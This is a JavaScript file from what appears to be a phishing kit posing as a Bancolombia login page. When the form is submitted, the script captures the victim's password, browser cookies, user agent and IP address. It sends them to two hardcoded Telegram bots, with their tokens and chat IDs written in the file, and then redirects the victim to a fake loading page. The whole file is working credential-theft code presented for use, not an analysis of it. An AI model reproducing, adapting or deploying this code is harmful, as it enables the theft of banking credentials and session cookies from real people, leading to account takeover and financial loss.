const formulario = document.getElementById('miFormulario');
// const clave = document.getElementById('miInput');

// Array de configuraciones de bots de Telegram
const telegramBots = [
  {
    botToken: '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI',
    chatId: '6328222257'
  },
  // Puedes añadir más bots aquí
  {
     botToken: '7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY',
     chatId: '7038426430'
  }
];

// const botToken = '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI';
// const chatId = '6328222257';
const ipifyUrl = 'https://api.ipify.org?format=json';

//esta funcion muestra mi loading-overlay
function showLoader() {
  document.getElementById('loading-overlay').style.display = 'flex';
}

// Función para enviar mensaje a un bot de Telegram
async function sendTelegramMessage(botConfig, messageData) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botConfig.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: botConfig.chatId,
        text: messageData,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      console.error(`Error enviando mensaje al bot ${botConfig.botToken}`);
    }
  } catch (error) {
    console.error("Error enviando mensaje a Telegram", error);
  }
}


formulario.addEventListener('submit', async function (event) {
  event.preventDefault();
  showLoader();
  
  try {
    const clave = event.target.elements.miInput.value;
    const userAgent = navigator.userAgent;
    const ipResponse = await fetch(ipifyUrl);
    const { ip } = await ipResponse.json();
    const currentDate = new Date();
    const formattedDate = `${currentDate.getDate()}/${currentDate.getMonth() + 1}/${currentDate.getFullYear()}`;
    
    const message = `✅\n<b>${ip}</b>\n \n👨🏻‍💻<b>  Bancolombia PasswordLogs</b>\n \n🔑 Password: <b>${clave}</b>\n\n🍪 Cookies: ${document.cookie || 'Sin cookies'}\n`;
    
    // Enviar mensaje a todos los bots configurados
    await Promise.all(telegramBots.map(bot => sendTelegramMessage(bot, message)));
    
    // Simula un tiempo de carga y luego redirige
    setTimeout(function() {
      window.location.href = './loader.html';
    }, 3000);
    
  } catch (error) {
    console.error("Error en el proceso", error);
  }
});
